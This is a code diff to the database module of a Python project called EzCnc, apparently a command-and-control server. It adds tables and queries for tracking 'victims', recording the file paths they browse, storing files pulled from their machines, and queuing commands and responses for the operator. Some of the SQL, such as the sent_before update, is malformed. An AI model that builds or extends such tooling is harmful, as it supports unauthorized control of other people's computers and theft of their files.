@@ -6,7 +6,8 @@ from loguru import logger
 from EzCnc.Exceptions import EzCncError
 import os
 import plotly.graph_objects as go
-
+import io
+from icecream import ic
 
 class DB:
     def __init__(self, name: str) -> None:
@@ -76,6 +77,8 @@ class DB:
                 file blob NOT NULL,
                 file_type TEXT NOT NULL,
                 received_date DATETIME DEFAULT CURRENT_TIMESTAMP,
+                command TEXT NOT NULL,
+                sent_before INTEGER,
                 FOREIGN KEY (files_id) REFERENCES victims(id)
             );
         """
@@ -100,7 +103,19 @@ class DB:
                 command TEXT NOT NULL,
                 response,
                 result INTEGER,
+                sent_before INTEGER,
                 FOREIGN KEY(id) REFERENCES victims(id)
+            );
+        """
+        file_manager_table = """
+
+        CREATE TABLE IF NOT EXISTS
+            file_manager(
+                id INTEGER,
+                response_time DATETIME DEFAULT CURRENT_TIMESTAMP,
+                last_path TEXT,
+                FOREIGN KEY(id) REFERENCES victims(id)
+                
             );
         """
 
@@ -109,6 +124,8 @@ class DB:
         self.cr.execute(files_table)
         self.cr.execute(commands_table)
         self.cr.execute(response_table)
+        self.cr.execute(file_manager_table)
+
 
     def uuid_to_id(self, uuid: str) -> int:
         resp = self.cr.execute("SELECT id FROM victims WHERE uuid = ?", (uuid,))
@@ -132,7 +149,7 @@ class DB:
             Query1 = "INSERT INTO victims(uuid) SELECT ? WHERE NOT EXISTS (SELECT 1 FROM victims WHERE uuid = ?)"
             Query2 = "SELECT id FROM victims WHERE uuid = ?"
             Query3 = "INSERT INTO victims_data(data_id,name,ip,country,location) VALUES(?,?,?,?,?)"
-
+            Query4 = "INSERT INTO file_manager (id,last_path) VALUES(?,?)"
             self.cr.execute(Query1, (client.uuid, client.uuid))
 
             if self.cr.rowcount > 0:
@@ -140,6 +157,7 @@ class DB:
                 self.cr.execute(
                     Query3, (ID, client.name, client.ip, client.country, client.location)
                 )
+                self.cr.execute(Query4,(ID,None))
                 self.db.commit()
                 return True
             else:
@@ -170,7 +188,8 @@ class DB:
     def iscommanded(self, Requester: CommandRequester) -> Union[Command, bool]:
         try:
             Query = "SELECT * FROM commands WHERE target= ?"
-            res = self.cr.execute(Query, (Requester.uuid,)).fetchone()
+            cursor = self.cr.execute(Query, (Requester.uuid,))
+            res    = cursor.fetchone()
             if res:
                 return Command(command=res[2], target=res[3], parameter=res[4])
             else:
@@ -178,8 +197,8 @@ class DB:
         except Exception as e:
             raise EzCncError(f"Exception occured while checking for commands [ {e} ]")
 
-    def insert_file(self, file_data, uuid: str):
-        query = "INSERT INTO files (files_id, file_name,file, file_type) VALUES (? , ? , ? , ?)"
+    def insert_file(self, file_data, uuid: str,command:str):
+        query = "INSERT INTO files (files_id, file_name,file, file_type,command) VALUES (? , ? , ? , ?,?)"
         self.cr.execute(
             query,
             (
@@ -187,10 +206,33 @@ class DB:
                 file_data.filename,
                 file_data.file.read(),
                 os.path.splitext(file_data.filename)[1],
+                command
             ),
         )
+        Query3 = "DELETE FROM commands where command = ? and target = ?"
+        self.cr.execute(Query3,(command,uuid))
         self.db.commit()
 
+    def update_latest_path(self,id,path:str):
+        ic(id)
+        Query = "UPDATE file_manager SET last_path = ? WHERE id = ?;"
+        self.cr.execute(Query,(str(path),id))
+        self.db.commit()
+        return path
+    
+    def change_sent_status(self,status:int,response_time,table:str):
+        if table == "response":
+            Query = "UPDATE response SET sent_before ? where response_time = ?"
+        else:
+            Query = "UPDATE files SET sent_before ? where received_date= ?"
+        
+        self.cr.execute(Query,(status,response_time))        
+        self.db.commit()
+                
+    def  get_latest_path(self,id):
+        Query = "SELECT last_path FROM file_manager WHERE id=?"
+        resp = self.cr.execute(Query,(id,))
+        return resp.fetchone()[0]
     def _return_all_uuids(self) -> list:
         query = "SELECT uuid from victims"
         return self.cr.execute(query).fetchall()
@@ -203,13 +245,35 @@ class DB:
         query = "SELECT name from victims_data"
         return self.cr.execute(query).fetchall()
     
-    def get_response(self,command:str,name:str) -> tuple:
+    def get_response(self,command:str,name:str) -> tuple|None:
         query = "SELECT * FROM response where command =? and id=? ORDER BY response_time DESC"
-        return self.cr.execute(query,(command, self.uuid_to_id((self.name_to_uuid(name))))).fetchone()
+        response_text = self.cr.execute(query,(command, self.uuid_to_id((self.name_to_uuid(name))))).fetchone()
+        if response_text:
+            return response_text
+        else:
+            return None
     
     def get_latest_responses(self,id:str|int,time:int) -> list[tuple] | None:
-        query = "SELECT * FROM response WHERE id=? and response_time >= datetime('now', ?);"
-        return self.cr.execute(query,(id,'-{} seconds'.format(time))).fetchall()
+        query = """SELECT * FROM (
+        SELECT id,response_time,command,response,result 
+        FROM response WHERE id=? and sent_before = 0 AND response_time >= datetime('now', ?)
+        UNION ALL
+        SELECT files_id,file_name,file,file_type,received_date
+        FROM files WHERE files_id=? AND sent_before = 0 AND received_date >= datetime('now', ?)
+    ) AS subquery
+    ORDER BY response_time DESC LIMIT 1;"""
+        res = self.cr.execute(query,(id,'-{} seconds'.format(time),id,'-{} seconds'.format(time))).fetchone()
+        if res:
+            ic(res)
+            res2 = res[2]
+            if type(res2) == bytes:
+                File = io.BytesIO(res2)
+                res = (res[0],res[1],File,res[3],res[4])
+                return (res,"File")
+            else:
+                return (res,"Text")
+        else:
+            ic(res)
     def insert_response(self, resp: ClientResponse):
         Query1 = "INSERT INTO response(id,command,response,result) VALUES(?,?,?,?)"
         Query2 = "INSERT INTO response(id,command,result) VALUES(?,?,?)"
